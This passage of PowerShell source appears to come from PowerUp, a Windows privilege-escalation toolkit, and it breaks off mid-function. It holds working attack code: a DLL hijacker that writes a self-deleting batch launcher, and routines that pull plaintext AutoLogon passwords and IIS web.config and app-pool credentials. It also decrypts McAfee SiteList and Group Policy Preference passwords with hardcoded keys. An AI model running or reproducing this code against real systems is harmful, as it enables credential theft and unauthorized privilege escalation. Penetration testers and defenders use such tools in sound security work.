AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

    if ($PSBoundParameters['Architecture']) {
        $TargetArchitecture = $Architecture
    }
    elseif ($Env:PROCESSOR_ARCHITECTURE -eq 'AMD64') {
        $TargetArchitecture = 'x64'
    }
    else {
        $TargetArchitecture = 'x86'
    }

    if ($TargetArchitecture -eq 'x64') {
        [Byte[]]$DllBytes = [Byte[]][Convert]::FromBase64String($DllBytes64)
    }
    else {
        [Byte[]]$DllBytes = [Byte[]][Convert]::FromBase64String($DllBytes32)
    }

    if ($PSBoundParameters['BatPath']) {
        $TargetBatPath = $BatPath
    }
    else {
        $BasePath = $DllPath | Split-Path -Parent
        $TargetBatPath = "$BasePath\debug.bat"
    }

    # patch in the appropriate .bat launcher path
    $DllBytes = Invoke-PatchDll -DllBytes $DllBytes -SearchString 'debug.bat' -ReplaceString $TargetBatPath

    # build the launcher .bat
    if (Test-Path $TargetBatPath) { Remove-Item -Force $TargetBatPath }

    "@echo off" | Out-File -Encoding ASCII -Append $TargetBatPath
    "start /b $BatCommand" | Out-File -Encoding ASCII -Append $TargetBatPath
    'start /b "" cmd /c del "%~f0"&exit /b' | Out-File -Encoding ASCII -Append $TargetBatPath

    Write-Verbose ".bat launcher written to: $TargetBatPath"
    Set-Content -Value $DllBytes -Encoding Byte -Path $DllPath
    Write-Verbose "$TargetArchitecture DLL Hijacker written to: $DllPath"

    $Out = New-Object PSObject
    $Out | Add-Member Noteproperty 'DllPath' $DllPath
    $Out | Add-Member Noteproperty 'Architecture' $TargetArchitecture
    $Out | Add-Member Noteproperty 'BatLauncherPath' $TargetBatPath
    $Out | Add-Member Noteproperty 'Command' $BatCommand
    $Out.PSObject.TypeNames.Insert(0, 'PowerUp.HijackableDLL')
    $Out
}


########################################################
#
# Registry Checks
#
########################################################

function Get-RegistryAlwaysInstallElevated {
    [OutputType('System.Boolean')]
    [CmdletBinding()]
    Param()

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = 'SilentlyContinue'

    if (Test-Path 'HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer') {

        $HKLMval = (Get-ItemProperty -Path 'HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue)
        Write-Verbose "HKLMval: $($HKLMval.AlwaysInstallElevated)"

        if ($HKLMval.AlwaysInstallElevated -and ($HKLMval.AlwaysInstallElevated -ne 0)){

            $HKCUval = (Get-ItemProperty -Path 'HKCU:SOFTWARE\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue)
            Write-Verbose "HKCUval: $($HKCUval.AlwaysInstallElevated)"

            if ($HKCUval.AlwaysInstallElevated -and ($HKCUval.AlwaysInstallElevated -ne 0)){
                Write-Verbose 'AlwaysInstallElevated enabled on this machine!'
                $True
            }
            else{
                Write-Verbose 'AlwaysInstallElevated not enabled on this machine.'
                $False
            }
        }
        else{
            Write-Verbose 'AlwaysInstallElevated not enabled on this machine.'
            $False
        }
    }
    else{
        Write-Verbose 'HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer does not exist'
        $False
    }
    $ErrorActionPreference = $OrigError
}


function Get-RegistryAutoLogon {

    [OutputType('PowerUp.RegistryAutoLogon')]
    [CmdletBinding()]
    Param()

    $AutoAdminLogon = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AutoAdminLogon -ErrorAction SilentlyContinue)
    Write-Verbose "AutoAdminLogon key: $($AutoAdminLogon.AutoAdminLogon)"

    if ($AutoAdminLogon -and ($AutoAdminLogon.AutoAdminLogon -ne 0)) {

        $DefaultDomainName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultDomainName -ErrorAction SilentlyContinue).DefaultDomainName
        $DefaultUserName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultUserName -ErrorAction SilentlyContinue).DefaultUserName
        $DefaultPassword = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword -ErrorAction SilentlyContinue).DefaultPassword
        $AltDefaultDomainName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultDomainName -ErrorAction SilentlyContinue).AltDefaultDomainName
        $AltDefaultUserName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultUserName -ErrorAction SilentlyContinue).AltDefaultUserName
        $AltDefaultPassword = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultPassword -ErrorAction SilentlyContinue).AltDefaultPassword

        if ($DefaultUserName -or $AltDefaultUserName) {
            $Out = New-Object PSObject
            $Out | Add-Member Noteproperty 'DefaultDomainName' $DefaultDomainName
            $Out | Add-Member Noteproperty 'DefaultUserName' $DefaultUserName
            $Out | Add-Member Noteproperty 'DefaultPassword' $DefaultPassword
            $Out | Add-Member Noteproperty 'AltDefaultDomainName' $AltDefaultDomainName
            $Out | Add-Member Noteproperty 'AltDefaultUserName' $AltDefaultUserName
            $Out | Add-Member Noteproperty 'AltDefaultPassword' $AltDefaultPassword
            $Out.PSObject.TypeNames.Insert(0, 'PowerUp.RegistryAutoLogon')
            $Out
        }
    }
}

function Get-ModifiableRegistryAutoRun {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.ModifiableRegistryAutoRun')]
    [CmdletBinding()]
    Param()

    $SearchLocations = @(   "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                            "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
                            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run",
                            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce",
                            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunService",
                            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceService",
                            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunService",
                            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceService"
                        )

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    $SearchLocations | Where-Object { Test-Path $_ } | ForEach-Object {

        $Keys = Get-Item -Path $_
        $ParentPath = $_

        ForEach ($Name in $Keys.GetValueNames()) {

            $Path = $($Keys.GetValue($Name))

            $Path | Get-ModifiablePath | ForEach-Object {
                $Out = New-Object PSObject
                $Out | Add-Member Noteproperty 'Key' "$ParentPath\$Name"
                $Out | Add-Member Noteproperty 'Path' $Path
                $Out | Add-Member Noteproperty 'ModifiableFile' $_
                $Out | Add-Member Aliasproperty Name Key
                $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiableRegistryAutoRun')
                $Out
            }
        }
    }

    $ErrorActionPreference = $OrigError
}


function Get-ModifiableScheduledTaskFile {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.ModifiableScheduledTaskFile')]
    [CmdletBinding()]
    Param()

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    $Path = "$($ENV:windir)\System32\Tasks"

    # recursively enumerate all schtask .xmls
    Get-ChildItem -Path $Path -Recurse | Where-Object { -not $_.PSIsContainer } | ForEach-Object {
        try {
            $TaskName = $_.Name
            $TaskXML = [xml] (Get-Content $_.FullName)
            if ($TaskXML.Task.Triggers) {

                $TaskTrigger = $TaskXML.Task.Triggers.OuterXML

                # check schtask command
                $TaskXML.Task.Actions.Exec.Command | Get-ModifiablePath | ForEach-Object {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'TaskName' $TaskName
                    $Out | Add-Member Noteproperty 'TaskFilePath' $_
                    $Out | Add-Member Noteproperty 'TaskTrigger' $TaskTrigger
                    $Out | Add-Member Aliasproperty Name TaskName
                    $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiableScheduledTaskFile')
                    $Out
                }

                # check schtask arguments
                $TaskXML.Task.Actions.Exec.Arguments | Get-ModifiablePath | ForEach-Object {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'TaskName' $TaskName
                    $Out | Add-Member Noteproperty 'TaskFilePath' $_
                    $Out | Add-Member Noteproperty 'TaskTrigger' $TaskTrigger
                    $Out | Add-Member Aliasproperty Name TaskName
                    $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiableScheduledTaskFile')
                    $Out
                }
            }
        }
        catch {
            Write-Verbose "Error: $_"
        }
    }
    $ErrorActionPreference = $OrigError
}


function Get-UnattendedInstallFile {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.UnattendedInstallFile')]
    [CmdletBinding()]
    Param()

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    $SearchLocations = @(   "c:\sysprep\sysprep.xml",
                            "c:\sysprep\sysprep.inf",
                            "c:\sysprep.inf",
                            (Join-Path $Env:WinDir "\Panther\Unattended.xml"),
                            (Join-Path $Env:WinDir "\Panther\Unattend\Unattended.xml"),
                            (Join-Path $Env:WinDir "\Panther\Unattend.xml"),
                            (Join-Path $Env:WinDir "\Panther\Unattend\Unattend.xml"),
                            (Join-Path $Env:WinDir "\System32\Sysprep\unattend.xml"),
                            (Join-Path $Env:WinDir "\System32\Sysprep\Panther\unattend.xml")
                        )

    # test the existence of each path and return anything found
    $SearchLocations | Where-Object { Test-Path $_ } | ForEach-Object {
        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'UnattendPath' $_
        $Out | Add-Member Aliasproperty Name UnattendPath
        $Out.PSObject.TypeNames.Insert(0, 'PowerUp.UnattendedInstallFile')
        $Out
    }

    $ErrorActionPreference = $OrigError
}


function Get-WebConfig {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingInvokeExpression', '')]
    [OutputType('System.Boolean')]
    [OutputType('System.Data.DataTable')]
    [CmdletBinding()]
    Param()

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = 'SilentlyContinue'

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\InetSRV\appcmd.exe")) {

        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add('user')
        $Null = $DataTable.Columns.Add('pass')
        $Null = $DataTable.Columns.Add('dbserv')
        $Null = $DataTable.Columns.Add('vdir')
        $Null = $DataTable.Columns.Add('path')
        $Null = $DataTable.Columns.Add('encr')

        # Get list of virtual directories in IIS
        C:\Windows\System32\InetSRV\appcmd.exe list vdir /text:physicalpath |
        ForEach-Object {

            $CurrentVdir = $_

            # Converts CMD style env vars (%) to powershell env vars (env)
            if ($_ -like "*%*") {
                $EnvarName = "`$Env:"+$_.split("%")[1]
                $EnvarValue = Invoke-Expression $EnvarName
                $RestofPath = $_.split('%')[2]
                $CurrentVdir  = $EnvarValue+$RestofPath
            }

            # Search for web.config files in each virtual directory
            $CurrentVdir | Get-ChildItem -Recurse -Filter web.config | ForEach-Object {

                # Set web.config path
                $CurrentPath = $_.fullname

                # Read the data from the web.config xml file
                [xml]$ConfigFile = Get-Content $_.fullname

                # Check if the connectionStrings are encrypted
                if ($ConfigFile.configuration.connectionStrings.add) {

                    # Foreach connection string add to data table
                    $ConfigFile.configuration.connectionStrings.add|
                    ForEach-Object {

                        [String]$MyConString = $_.connectionString
                        if ($MyConString -like '*password*') {
                            $ConfUser = $MyConString.Split('=')[3].Split(';')[0]
                            $ConfPass = $MyConString.Split('=')[4].Split(';')[0]
                            $ConfServ = $MyConString.Split('=')[1].Split(';')[0]
                            $ConfVdir = $CurrentVdir
                            $ConfEnc = 'No'
                            $Null = $DataTable.Rows.Add($ConfUser, $ConfPass, $ConfServ, $ConfVdir, $CurrentPath, $ConfEnc)
                        }
                    }
                }
                else {

                    # Find newest version of aspnet_regiis.exe to use (it works with older versions)
                    $AspnetRegiisPath = Get-ChildItem -Path "$Env:SystemRoot\Microsoft.NET\Framework\" -Recurse -filter 'aspnet_regiis.exe'  | Sort-Object -Descending | Select-Object fullname -First 1

                    # Check if aspnet_regiis.exe exists
                    if (Test-Path  ($AspnetRegiisPath.FullName)) {

                        # Setup path for temp web.config to the current user's temp dir
                        $WebConfigPath = (Get-Item $Env:temp).FullName + '\web.config'

                        # Remove existing temp web.config
                        if (Test-Path  ($WebConfigPath)) {
                            Remove-Item $WebConfigPath
                        }

                        # Copy web.config from vdir to user temp for decryption
                        Copy-Item $CurrentPath $WebConfigPath

                        # Decrypt web.config in user temp
                        $AspnetRegiisCmd = $AspnetRegiisPath.fullname+' -pdf "connectionStrings" (get-item $Env:temp).FullName'
                        $Null = Invoke-Expression $AspnetRegiisCmd

                        # Read the data from the web.config in temp
                        [xml]$TMPConfigFile = Get-Content $WebConfigPath

                        # Check if the connectionStrings are still encrypted
                        if ($TMPConfigFile.configuration.connectionStrings.add) {

                            # Foreach connection string add to data table
                            $TMPConfigFile.configuration.connectionStrings.add | ForEach-Object {

                                [String]$MyConString = $_.connectionString
                                if ($MyConString -like '*password*') {
                                    $ConfUser = $MyConString.Split('=')[3].Split(';')[0]
                                    $ConfPass = $MyConString.Split('=')[4].Split(';')[0]
                                    $ConfServ = $MyConString.Split('=')[1].Split(';')[0]
                                    $ConfVdir = $CurrentVdir
                                    $ConfEnc = 'Yes'
                                    $Null = $DataTable.Rows.Add($ConfUser, $ConfPass, $ConfServ, $ConfVdir, $CurrentPath, $ConfEnc)
                                }
                            }
                        }
                        else {
                            Write-Verbose "Decryption of $CurrentPath failed."
                            $False
                        }
                    }
                    else {
                        Write-Verbose 'aspnet_regiis.exe does not exist in the default location.'
                        $False
                    }
                }
            }
        }

        # Check if any connection strings were found
        if ( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable | Sort-Object user,pass,dbserv,vdir,path,encr | Select-Object user,pass,dbserv,vdir,path,encr -Unique
        }
        else {
            Write-Verbose 'No connection strings found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}


function Get-ApplicationHost {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingInvokeExpression', '')]
    [OutputType('System.Data.DataTable')]
    [OutputType('System.Boolean')]
    [CmdletBinding()]
    Param()

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = 'SilentlyContinue'

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add('user')
        $Null = $DataTable.Columns.Add('pass')
        $Null = $DataTable.Columns.Add('type')
        $Null = $DataTable.Columns.Add('vdir')
        $Null = $DataTable.Columns.Add('apppool')

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if ( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}


function Get-SiteListPassword {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.SiteListPassword')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateScript({Test-Path -Path $_ })]
        [String[]]
        $Path
    )

    BEGIN {
        function Local:Get-DecryptedSitelistPassword {
            # PowerShell adaptation of https://github.com/funoverip/mcafee-sitelist-pwd-decryption/
            # Original Author: Jerome Nokin (@funoverip / jerome.nokin@gmail.com)
            # port by @harmj0y
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
            [CmdletBinding()]
            Param(
                [Parameter(Mandatory = $True)]
                [String]
                $B64Pass
            )

            # make sure the appropriate assemblies are loaded
            Add-Type -Assembly System.Security
            Add-Type -Assembly System.Core

            # declare the encoding/crypto providers we need
            $Encoding = [System.Text.Encoding]::ASCII
            $SHA1 = New-Object System.Security.Cryptography.SHA1CryptoServiceProvider
            $3DES = New-Object System.Security.Cryptography.TripleDESCryptoServiceProvider

            # static McAfee key XOR key LOL
            $XORKey = 0x12,0x15,0x0F,0x10,0x11,0x1C,0x1A,0x06,0x0A,0x1F,0x1B,0x18,0x17,0x16,0x05,0x19

            # xor the input b64 string with the static XOR key
            $I = 0;
            $UnXored = [System.Convert]::FromBase64String($B64Pass) | Foreach-Object { $_ -BXor $XORKey[$I++ % $XORKey.Length] }

            # build the static McAfee 3DES key TROLOL
            $3DESKey = $SHA1.ComputeHash($Encoding.GetBytes('<!@#$%^>')) + ,0x00*4

            # set the options we need
            $3DES.Mode = 'ECB'
            $3DES.Padding = 'None'
            $3DES.Key = $3DESKey

            # decrypt the unXor'ed block
            $Decrypted = $3DES.CreateDecryptor().TransformFinalBlock($UnXored, 0, $UnXored.Length)

            # ignore the padding for the result
            $Index = [Array]::IndexOf($Decrypted, [Byte]0)
            if ($Index -ne -1) {
                $DecryptedPass = $Encoding.GetString($Decrypted[0..($Index-1)])
            }
            else {
                $DecryptedPass = $Encoding.GetString($Decrypted)
            }

            New-Object -TypeName PSObject -Property @{'Encrypted'=$B64Pass;'Decrypted'=$DecryptedPass}
        }

        function Local:Get-SitelistField {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
            [CmdletBinding()]
            Param(
                [Parameter(Mandatory = $True)]
                [String]
                $Path
            )

            try {
                [Xml]$SiteListXml = Get-Content -Path $Path

                if ($SiteListXml.InnerXml -Like "*password*") {
                    Write-Verbose "Potential password in found in $Path"

                    $SiteListXml.SiteLists.SiteList.ChildNodes | Foreach-Object {
                        try {
                            $PasswordRaw = $_.Password.'#Text'

                            if ($_.Password.Encrypted -eq 1) {
                                # decrypt the base64 password if it's marked as encrypted
                                $DecPassword = if ($PasswordRaw) { (Get-DecryptedSitelistPassword -B64Pass $PasswordRaw).Decrypted } else {''}
                            }
                            else {
                                $DecPassword = $PasswordRaw
                            }

                            $Server = if ($_.ServerIP) { $_.ServerIP } else { $_.Server }
                            $Path = if ($_.ShareName) { $_.ShareName } else { $_.RelativePath }

                            $ObjectProperties = @{
                                'Name' = $_.Name;
                                'Enabled' = $_.Enabled;
                                'Server' = $Server;
                                'Path' = $Path;
                                'DomainName' = $_.DomainName;
                                'UserName' = $_.UserName;
                                'EncPassword' = $PasswordRaw;
                                'DecPassword' = $DecPassword;
                            }
                            $Out = New-Object -TypeName PSObject -Property $ObjectProperties
                            $Out.PSObject.TypeNames.Insert(0, 'PowerUp.SiteListPassword')
                            $Out
                        }
                        catch {
                            Write-Verbose "Error parsing node : $_"
                        }
                    }
                }
            }
            catch {
                Write-Warning "Error parsing file '$Path' : $_"
            }
        }
    }

    PROCESS {
        if ($PSBoundParameters['Path']) {
            $XmlFilePaths = $Path
        }
        else {
            $XmlFilePaths = @('C:\Program Files\','C:\Program Files (x86)\','C:\Documents and Settings\','C:\Users\')
        }

        $XmlFilePaths | Foreach-Object { Get-ChildItem -Path $_ -Recurse -Include 'SiteList.xml' -ErrorAction SilentlyContinue } | Where-Object { $_ } | Foreach-Object {
            Write-Verbose "Parsing SiteList.xml file '$($_.Fullname)'"
            Get-SitelistField -Path $_.Fullname
        }
    }
}


function Get-CachedGPPPassword {

    [CmdletBinding()]
    Param()

    # Some XML issues between versions
    Set-StrictMode -Version 2

    # make sure the appropriate assemblies are loaded
    Add-Type -Assembly System.Security
    Add-Type -Assembly System.Core

    # helper that decodes and decrypts password
    function local:Get-DecryptedCpassword {
        [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
        [CmdletBinding()]
        Param(
            [string] $Cpassword
        )

        try {
            # Append appropriate padding based on string length
            $Mod = ($Cpassword.length % 4)

            switch ($Mod) {
                '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
                '2' {$Cpassword += ('=' * (4 - $Mod))}
                '3' {$Cpassword += ('=' * (4 - $Mod))}
            }

            $Base64Decoded = [Convert]::FromBase64String($Cpassword)

            # Create a new AES .NET Crypto Object
            $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
            [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                 0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)

            # Set IV to all nulls to prevent dynamic generation of IV value
            $AesIV = New-Object Byte[]($AesObject.IV.Length)
            $AesObject.IV = $AesIV
            $AesObject.Key = $AesKey
            $DecryptorObject = $AesObject.CreateDecryptor()
            [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)

            return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
        }

        catch {
            Write-Error $Error[0]
        }
    }

    # helper that parses fields from the found xml preference files
    function local:Get-GPPInnerField {
        [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
        [CmdletBinding()]
        Param(
            $File
        )

        try {
            $Filename = Split-Path $File -Leaf
            [XML] $Xml = Get-Content ($File)

            $Cpassword = @()
            $UserName = @()
            $NewName = @()
            $Changed = @()
            $Password = @()

            # check for password field
            if ($Xml.innerxml -like "*cpassword*"){

                Write-Verbose "Potential password in $File"

                switch ($Filename) {
                    'Groups.xml' {
                        $Cpassword += , $Xml | Select-Xml "/Groups/User/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/Groups/User/Properties/@userName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $NewName += , $Xml | Select-Xml "/Groups/User/Properties/@newName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/Groups/User/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }

                    'Services.xml' {
                        $Cpassword += , $Xml | Select-Xml "/NTServices/NTService/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/NTServices/NTService/Properties/@accountName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/NTServices/NTService/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }

                    'Scheduledtasks.xml' {
                        $Cpassword += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@runAs" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/ScheduledTasks/Task/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }

                    'DataSources.xml' {
                        $Cpassword += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/DataSources/DataSource/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }

                    'Printers.xml' {
                        $Cpassword += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/Printers/SharedPrinter/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }

                    'Drives.xml' {
                        $Cpassword += , $Xml | Select-Xml "/Drives/Drive/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $UserName += , $Xml | Select-Xml "/Drives/Drive/Properties/@username" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                        $Changed += , $Xml | Select-Xml "/Drives/Drive/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
                    }
                }
           }

           ForEach ($Pass in $Cpassword) {
               Write-Verbose "Decrypting $Pass"
               $DecryptedPassword = Get-DecryptedCpassword $Pass
               Write-Verbose "Decrypted a password of $DecryptedPassword"
               #append any new passwords to array
               $Password += , $DecryptedPassword
           }

            # put [BLANK] in variables
            if (-not $Password) {$Password = '[BLANK]'}
            if (-not $UserName) {$UserName = '[BLANK]'}
            if (-not $Changed)  {$Changed = '[BLANK]'}
            if (-not $NewName)  {$NewName = '[BLANK]'}

            # Create custom object to output results
            $ObjectProperties = @{'Passwords' = $Password;
                                  'UserNames' = $UserName;
                                  'Changed' = $Changed;
                                  'NewName' = $NewName;
                                  'File' = $File}

            $ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
            Write-Verbose "The password is between {} and may be more than one value."
            if ($ResultsObject) { Return $ResultsObject }
        }

        catch {Write-Error $Error[0]}
    }

    try {
        $AllUsers = $Env:ALLUSERSPROFILE

        if ($AllUsers -notmatch 'ProgramData') {
            $AllUsers = "$AllUsers\Application Data"
        }

        # discover any locally cached GPP .xml files
        $XMlFiles = Get-ChildItem -Path $AllUsers -Recurse -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml' -Force -ErrorAction SilentlyContinue

        if ( -not $XMlFiles ) {
            Write-Verbose 'No preference files found.'
        }
        else {
            Write-Verbose "Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords."

            ForEach ($File in $XMLFiles) {
                Get-GppInnerField $File.Fullname
            }
        }
    }

    catch {
        Write-Error $Error[0]
    }
}




function Invoke-PrivescAudit {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [ValidateSet('Object','List','HTML')]
        [String]
        $Format = 'Object',
        [Switch]
        $HTMLReport
    )

    if($HTMLReport){ $Format = 'HTML' }

    if ($Format -eq 'HTML') {
        $HtmlReportFile = "$($Env:ComputerName).$($Env:UserName).html"
        $Header = "<style>"
        $Header = $Header + "BODY{background-color:peachpuff;}"
        $Header = $Header + "TABLE{border-width: 1px;border-style: solid;border-color: black;border-collapse: collapse;}"
        $Header = $Header + "TH{border-width: 1px;padding: 0px;border-style: solid;border-color: black;background-color:thistle}"
        $Header = $Header + "TD{border-width: 3px;padding: 0px;border-style: solid;border-color: black;background-color:palegoldenrod}"
        $Header = $Header + "</style>"
        ConvertTo-HTML -Head $Header -Body "<H1>PowerUp report for '$($Env:ComputerName).$($Env:UserName)'</H1>" | Out-File $HtmlReportFile
    }

    Write-Verbose "Running Invoke-PrivescAudit"

    $Checks = @(
        # Initial admin checks
        @{
            Type    = 'User Has Local Admin Privileges'
            Command = { if (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")){ New-Object PSObject } }
        },
        @{
            Type        = 'User In Local Group with Admin Privileges'
